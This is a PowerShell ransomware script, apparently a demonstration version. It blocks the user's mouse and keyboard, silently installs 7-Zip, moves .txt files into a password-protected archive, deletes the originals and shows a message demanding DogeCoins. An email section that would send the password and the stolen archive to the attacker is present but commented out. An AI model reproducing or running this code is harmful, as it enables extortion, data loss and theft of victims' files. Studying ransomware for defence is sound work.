#Temporarily disable user mouse and keyboard input
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
$userInput::BlockInput($true)

#Install 7zip to zip files
$workdir = "c:\installer\"

If (Test-Path -Path $workdir -PathType Container)
{ Write-Host "$workdir already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $workdir  -ItemType directory }

#Download the installer
$source = "http://www.7-zip.org/a/7z1604-x64.msi"
$destination = "$workdir\7-Zip.msi"


if (Get-Command 'Invoke-Webrequest')
{
     Invoke-WebRequest $source -OutFile $destination
}
else
{
    $WebClient = New-Object System.Net.WebClient
    $webclient.DownloadFile($source, $destination)
}

Invoke-WebRequest $source -OutFile $destination 

#Start the installation
msiexec.exe /i "$workdir\7-Zip.msi" /qb

#Wait a few Seconds for the installation to finish
Start-Sleep -s 10

#Remove the installer
rm -Force $workdir\7*

#Set source and destination of files to copy and store (ideally you would use something other than desktop)
$Source = "C:\Users\(username)\Desktop\StealableFiles"
$Destination = "C:\Users\(username)\Desktop\StolenFiles"

#Copy all files with certain extension and delete them in the source location
$cp = robocopy /mov $Source $Destination *.txt /s

#Set the password to password
[Reflection.Assembly]::LoadWithPartialName("System.Web")
#The old cold generated a random password
#$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
$randomPassword = "password"

#@@SC: Piping password out to C for demo purposes
$randomPassword | Out-File -FilePath "c:\RansomeLockedPassword.txt" -Force

#Set source for 7zip exe (usually the same path in most basic computers)
$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"

#Zip destination folder with the random password previously generated
$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

#Delete the destination folder
$del = Remove-Item $Destination -Force -Recurse

<# @@SC: Commenting out email section
$email = "(enter email address you want files sent to)"

#Send password for files to your e-mail
$SMTPServer = "smtp.example.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
$Body =  $randomPassword
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Mailer.send($Msg)
$Msg.Dispose()
$Mailer.Dispose()

#Send zip folder to your e-mail
$ZipFolder = "C:\Users\(username)\Desktop\StolenFiles.zip"
$SMTPServer = "smtp.example.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()
#>
#Delete the zip file created
$del = Remove-Item $ZipFolder -Force -Recurse

#Disable temporary user keyboard and mouse input block
$userInput::BlockInput($false)

#Display a message demanding money
#Add the required .NET assembly for message display
Add-Type -AssemblyName System.Windows.Forms

#Set the background to ransomware
#set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png

#Show the message
$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
